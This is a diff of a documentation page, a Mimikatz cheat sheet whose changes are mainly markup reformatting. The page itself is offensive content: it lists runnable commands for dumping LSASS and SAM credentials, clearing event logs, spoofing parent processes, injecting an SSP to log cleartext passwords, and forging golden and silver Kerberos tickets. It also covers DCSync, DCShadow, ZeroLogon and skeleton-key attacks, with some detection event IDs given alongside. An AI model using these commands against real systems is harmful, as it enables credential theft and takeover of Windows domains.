@@ -1,32 +1,35 @@
 ---
-title: Mimikatz CheatSheet
-description: Comprehensive guide to Mimikatz commands for credential dumping, privilege escalation, and Active Directory attacks.
+title: "Mimikatz CheatSheet"
+description: "Comprehensive guide to Mimikatz commands for credential dumping, privilege escalation, and Active Directory attacks."
 tags:
-  - T1003
-  - Credentials
-  - ActiveDirectory
+  - "T1003"
+  - "Credentials"
+  - "ActiveDirectory"
 ---
 
 # Mimikatz CheatSheet
 
 ![Mimikatz Architecture](/docs/Asset/Pasted%20image%2020260227171733.png)
 
-<Callout type="info" title="Log Module – Save Command Output">
-Allows saving Mimikatz session output to a file.
+<Info>
+  Allows saving Mimikatz session output to a file.
 
-**Start Logging**
-```bash
-mimikatz # log C:\Temp\msupdate.log
-```
-- Creates a log file at the specified path  
-- You must define the full file path and file name  
-- All subsequent command output will be written to this file  
+  **Start Logging**
 
-**Stop Logging**
-```bash
-mimikatz # log /stop
-```
-</Callout>
+  ```bash
+  mimikatz # log C:\Temp\msupdate.log
+  ```
+
+  - Creates a log file at the specified path
+  - You must define the full file path and file name
+  - All subsequent command output will be written to this file
+
+  **Stop Logging**
+
+  ```bash
+  mimikatz # log /stop
+  ```
+</Info>
 
 ---
 
@@ -41,35 +44,42 @@ The `misc` module includes helper functions that may assist in bypassing applica
     mimikatz # misc::regedit
     mimikatz # misc::taskmgr
     ```
+
     Launches trusted Windows binaries that may bypass weak AppLocker policies.
   </Tab>
   <Tab title="Mini-Filter Drivers">
     ```bash
     mimikatz # misc::mflt
     ```
+
     Displays installed file system mini-filter drivers.
   </Tab>
   <Tab title="Desktop Wallpaper">
     ```bash
     mimikatz # misc::wp /file:C:\Users\Desktop\2.png
     ```
+
     Sets desktop wallpaper to specified file.
   </Tab>
   <Tab title="Clipboard Capture">
     ```bash
     mimikatz # misc::clip
     ```
+
     Attempts to capture clipboard data.
+
     <Warning>
-    **Monitoring Note:**
-    - Injection into `csrss.exe`
-    - Sysmon Event ID **8** → Remote thread creation
+      **Monitoring Note:**
+
+      - Injection into `csrss.exe`
+      - Sysmon Event ID **8** → Remote thread creation
     </Warning>
   </Tab>
   <Tab title="Detours">
     ```bash
     mimikatz # misc::detours
     ```
+
     Uses API hooking techniques that may assist in defense evasion.
   </Tab>
 </Tabs>
@@ -78,11 +88,11 @@ The `misc` module includes helper functions that may assist in bypassing applica
 
 ## Windows Privileges & Token Module
 
-<Callout type="warning" title="Relevant Event IDs">
-- **4672** → Special privileges assigned to new logon  
-- **4703** → A user right was adjusted  
-- **4688** → Process creation  
-</Callout>
+<Warning>
+  - **4672** → Special privileges assigned to new logon
+  - **4703** → A user right was adjusted
+  - **4688** → Process creation
+</Warning>
 
 <Tabs>
   <Tab title="Privilege Module">
@@ -137,14 +147,13 @@ The `misc` module includes helper functions that may assist in bypassing applica
 ### Privilege Escalation & Process Injection
 
 <Danger>
-**MITRE ATT&CK:** [T1134/001](https://attack.mitre.org/techniques/T1134/001) | [T1055](https://attack.mitre.org/techniques/T1055)
+  **MITRE ATT&CK:** [T1134/001](https://attack.mitre.org/techniques/T1134/001) | [T1055](https://attack.mitre.org/techniques/T1055)
 </Danger>
 
 <Steps>
   <Step title="Process Herpaderping Concept">
-    Modify executable signature/state on disk, execute payload under disguised name.
-    Reference: [github.com/jxy-s/herpaderping](https://github.com/jxy-s/herpaderping/)
-    
+    Modify executable signature/state on disk, execute payload under disguised name. Reference: [github.com/jxy-s/herpaderping](https://github.com/jxy-s/herpaderping/)
+
     ```powershell
     .\processherpaderpng.exe .\mimikatz name.exe C:\windows\system32\lsass.exe
     ```
@@ -193,14 +202,14 @@ The `misc` module includes helper functions that may assist in bypassing applica
 </Steps>
 
 <Danger>
-**MITRE ATT&CK:** [T1070/001](https://attack.mitre.org/techniques/T1070/001) | [T1134/004](https://attack.mitre.org/techniques/T1134/004/)
+  **MITRE ATT&CK:** [T1070/001](https://attack.mitre.org/techniques/T1070/001) | [T1134/004](https://attack.mitre.org/techniques/T1134/004/)
 </Danger>
 
 <Tabs>
   <Tab title="Event Log Manipulation">
     - Event ID **1102** → Security log cleared
     - Event ID **4663** → Object access (e.g., log file interaction)
-    
+
     ```bash
     # Clear Windows Event Logs.
     mimikatz # privilege::debug
@@ -221,14 +230,16 @@ The `misc` module includes helper functions that may assist in bypassing applica
   </Tab>
   <Tab title="Parent PID Spoofing">
     Create process with spoofed parent PID.
+
     ```bash
     mimikatz # privilege::debug
     mimikatz # token::elevate
     mimikatz # process::runp /run:"powershell.exe" /ppid:5828
     ```
+
     <Warning>
-    - If `/ppid` is not specified, default parent may be `lsass.exe`
-    - Used to evade behavioral detection based on process lineage
+      - If `/ppid` is not specified, default parent may be `lsass.exe`
+      - Used to evade behavioral detection based on process lineage
     </Warning>
   </Tab>
 </Tabs>
@@ -240,36 +251,41 @@ The `misc` module includes helper functions that may assist in bypassing applica
 <Tabs>
   <Tab title="RPC Operations">
     Mimikatz can operate in client/server mode over RPC (default port 135).
-    
+
     **RPC Server (Windows Side)**
+
     ```bash
     mimikatz # rpc::server
     mimikatz # rpc::server /stop
     mimikatz # rpc::server /secure
     ```
-    
+
     **RPC Client (Remote System)**
+
     ```bash
     mimikatz # rpc::connect /server:172.20.10.1
     mimikatz # rpc::connect /server:172.20.10.1 /alg:RC4
     mimikatz # rpc::close
     ```
-    
+
     **Base64 Encoding Mode**
+
     ```bash
     mimikatz # base64 /out:true /in:true
     ```
   </Tab>
   <Tab title="RDP Takeover">
     **MITRE ATT&CK:** [T1563/002](https://attack.mitre.org/techniques/T1563/002/)
+
     ```bash
     mimikatz # privilege::debug
     mimikatz # ts::multirdp
     mimikatz # ts::sessions
     mimikatz # ts::remote /id:<sessionID> /target:<sessionID> /password:<password>
     ```
-    
+
     **Built-in Windows Remote Methods**
+
     ```powershell
     winrm
     winrs
@@ -279,6 +295,7 @@ The `misc` module includes helper functions that may assist in bypassing applica
   </Tab>
   <Tab title="Service Module">
     Allows starting and stopping Windows services directly from Mimikatz.
+
     ```bash
     # Start a Service
     mimikatz # service::start <service_name>
@@ -333,21 +350,19 @@ mimikatz # process::terminate /pid:<PID>
 
 <CardGroup cols={2}>
   <Card title="LSA Protection (RunAsPPL)" icon="shield">
-    If UEFI and Secure Boot are enabled, LSA Protection can be active.
-    `HKLM:\System\CurrentControlSet\Control\Lsa` -> `RunAsPPL` (DWORD `1` = Enabled)
-    `lsass.exe` runs as a Protected Process Light (PPL).
+    If UEFI and Secure Boot are enabled, LSA Protection can be active. `HKLM:\System\CurrentControlSet\Control\Lsa` -> `RunAsPPL` (DWORD `1` = Enabled) `lsass.exe` runs as a Protected Process Light (PPL).
   </Card>
+
   <Card title="Credential Guard & VSM" icon="lock">
-    Requires UEFI, 64-bit OS, Virtualization Extensions, TPM.
-    Isolates `lsass.exe` secrets using Virtual Secure Mode (VSM) in `LSAISO.exe`.
+    Requires UEFI, 64-bit OS, Virtualization Extensions, TPM. Isolates `lsass.exe` secrets using Virtual Secure Mode (VSM) in `LSAISO.exe`.
   </Card>
+
   <Card title="SACL" icon="eye">
     Used for auditing. Can generate logs when LSASS is accessed.
   </Card>
+
   <Card title="Credential Storage Locations" icon="database">
-    Registry (SAM hive) -> Local account hashes
-    LSASS Memory -> Active logon sessions
-    SSP Modules -> Authentication packages
+    Registry (SAM hive) -> Local account hashes LSASS Memory -> Active logon sessions SSP Modules -> Authentication packages
   </Card>
 </CardGroup>
 
@@ -381,11 +396,14 @@ mimikatz # process::terminate /pid:<PID>
   </Tab>
   <Tab title="Inject Custom SSP (memssp)">
     Loads a custom SSP (mimilib) into registry. Credentials written in cleartext to `C:\Windows\System32\mimilsa.log`.
+
     ```bash
     mimikatz # privilege::debug
     mimikatz # misc::memssp
     ```
+
     Force re-authentication:
+
     ```cmd
     rundll32 user32.dll,LockWorkstation
     ```
@@ -394,6 +412,7 @@ mimikatz # process::terminate /pid:<PID>
     ```cmd
     reg save HKLM\SYSTEM system & reg save HKLM\SAM sam
     ```
+
     ```bash
     mimikatz # privilege::debug
     mimikatz # token::elevate
@@ -415,16 +434,17 @@ mimikatz # process::terminate /pid:<PID>
 
 ## DC ATTACK: Active Directory Exploitation
 
-<Callout type="info" title="Kerberos Overview">
-**KDC (Key Distribution Center)** runs on the Domain Controller and handles authentication and ticket issuance.
-* `krbtgt` signs and encrypts TGTs.
-* `SPN` is a unique identifier for services in AD.
-</Callout>
+<Info>
+  **KDC (Key Distribution Center)** runs on the Domain Controller and handles authentication and ticket issuance.
+
+  - `krbtgt` signs and encrypts TGTs.
+  - `SPN` is a unique identifier for services in AD.
+</Info>
 
 <Tabs>
   <Tab title="Over Pass The Hash (OPTH)">
     Combines PTH and PTT techniques. Attacker uses NTLM material to obtain or forge Kerberos authentication.
-    
+
     <Steps>
       <Step title="Step 1: Extract NTLM Credentials">
         ```bash
@@ -464,9 +484,9 @@ mimikatz # process::terminate /pid:<PID>
       </Step>
     </Steps>
   </Tab>
-
   <Tab title="Golden Ticket (TGT)">
     Forges a TGT using the `krbtgt` account hash.
+
     <Steps>
       <Step title="1. Get Domain SID & krbtgt Hash">
         ```bash
@@ -486,14 +506,14 @@ mimikatz # process::terminate /pid:<PID>
         ```
       </Step>
     </Steps>
+
     Optional Parameters: `/aes128:<AEShash>`, `/aes256:<AEShash>`, `/sids:513,512,500`, `/endin:50`
   </Tab>
-
   <Tab title="Silver Ticket (TGS)">
     Forges a TGS for a specific service using the target server’s NTLM hash.
-    
+
     **Common SPNs:** TERMSRV (RDP), CIFS (SMB), WSMAN (WinRM), SMTP, MSSQL, LDAP, DNS
-    
+
     <Steps>
       <Step title="1. Enumerating SPNs (PowerShell)">
         ```powershell
@@ -519,13 +539,13 @@ mimikatz # process::terminate /pid:<PID>
       </Step>
     </Steps>
   </Tab>
-
   <Tab title="DCSync">
     Impersonates a Domain Controller to request account replication data.
+
     <Danger>
-    **Detection:** Event ID `4662` (Directory Service Access)
+      **Detection:** Event ID `4662` (Directory Service Access)
     </Danger>
-    
+
     ```bash
     # Dump specific account (e.g., krbtgt)
     mimikatz # lsadump::dcsync /user:krbtgt
@@ -537,13 +557,13 @@ mimikatz # process::terminate /pid:<PID>
     mimikatz # lsadump::dcsync /all /csv
     ```
   </Tab>
-
   <Tab title="DCShadow">
     Registers a rogue DC and pushes malicious replication data.
+
     <Warning>
-    Requires Domain Admin / Enterprise Admin / Replication privileges, SYSTEM-level access, and firewall disabled.
+      Requires Domain Admin / Enterprise Admin / Replication privileges, SYSTEM-level access, and firewall disabled.
     </Warning>
-    
+
     <Steps>
       <Step title="Step 1: Open Mimikatz with SYSTEM Access">
         ```bash
@@ -574,10 +594,9 @@ mimikatz # process::terminate /pid:<PID>
       </Step>
     </Steps>
   </Tab>
-
   <Tab title="ZeroLogon">
     Critical Netlogon authentication protocol vulnerability. Allows impersonation of a domain-joined computer, including the DC.
-    
+
     ```bash
     # Attempt to exploit Netlogon flaw
     lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm
@@ -590,7 +609,9 @@ mimikatz # process::terminate /pid:<PID>
     ```
   </Tab>
 </Tabs>
+
 ---
+
 ## 📚 References & Resources
 
 <CardGroup cols={2}>
@@ -612,27 +633,27 @@ mimikatz # process::terminate /pid:<PID>
 </CardGroup>
 
 <Accordion title="📋 Overview Command Reference">
-    | Command | Definition |
-    | --- | --- |
-    | `CRYPTO::Certificates` | list/export certificates |
-    | `KERBEROS::Golden` | create golden/silver/trust tickets |
-    | `KERBEROS::List` | list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”. |
-    | `KERBEROS::PTT` | pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust). |
-    | `LSADUMP::DCSync` | ask a DC to synchronize an object (get password data for account). No need to run code on DC. |
-    | `LSADUMP::LSA` | Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt” |
-    | `LSADUMP::SAM` | get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer. |
-    | `LSADUMP::Trust` | Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest). |
-    | `MISC::AddSid` | Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. |
-    | `MISC::MemSSP` | Inject a malicious Windows SSP to log locally authenticated credentials. |
-    | `MISC::Skeleton` | Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password. |
-    | `PRIVILEGE::Debug` | get debug rights (this or Local System rights is required for many Mimikatz commands). |
-    | `SEKURLSA::Ekeys` | list Kerberos encryption keys |
-    | `SEKURLSA::Kerberos` | List Kerberos credentials for all authenticated users (including services and computer account) |
-    | `SEKURLSA::Krbtgt` | get Domain Kerberos service account (KRBTGT)password data |
-    | `SEKURLSA::LogonPasswords` | lists all available provider credentials. This usually shows recently logged on user and computer credentials. |
-    | `SEKURLSA::Pth` | Pass- theHash and Over-Pass-the-Hash |
-    | `SEKURLSA::Tickets` | Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). |
-    | `TOKEN::List` | list all tokens of the system |
-    | `TOKEN::Elevate` | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box |
-    | `TOKEN::Elevate /domainadmin` | impersonate a token with Domain Admin credentials. |
+  | Command | Definition |
+  | --- | --- |
+  | `CRYPTO::Certificates` | list/export certificates |
+  | `KERBEROS::Golden` | create golden/silver/trust tickets |
+  | `KERBEROS::List` | list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”. |
+  | `KERBEROS::PTT` | pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust). |
+  | `LSADUMP::DCSync` | ask a DC to synchronize an object (get password data for account). No need to run code on DC. |
+  | `LSADUMP::LSA` | Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt” |
+  | `LSADUMP::SAM` | get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer. |
+  | `LSADUMP::Trust` | Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest). |
+  | `MISC::AddSid` | Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. |
+  | `MISC::MemSSP` | Inject a malicious Windows SSP to log locally authenticated credentials. |
+  | `MISC::Skeleton` | Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password. |
+  | `PRIVILEGE::Debug` | get debug rights (this or Local System rights is required for many Mimikatz commands). |
+  | `SEKURLSA::Ekeys` | list Kerberos encryption keys |
+  | `SEKURLSA::Kerberos` | List Kerberos credentials for all authenticated users (including services and computer account) |
+  | `SEKURLSA::Krbtgt` | get Domain Kerberos service account (KRBTGT)password data |
+  | `SEKURLSA::LogonPasswords` | lists all available provider credentials. This usually shows recently logged on user and computer credentials. |
+  | `SEKURLSA::Pth` | Pass- theHash and Over-Pass-the-Hash |
+  | `SEKURLSA::Tickets` | Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). |
+  | `TOKEN::List` | list all tokens of the system |
+  | `TOKEN::Elevate` | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box |
+  | `TOKEN::Elevate /domainadmin` | impersonate a token with Domain Admin credentials. |
 </Accordion>
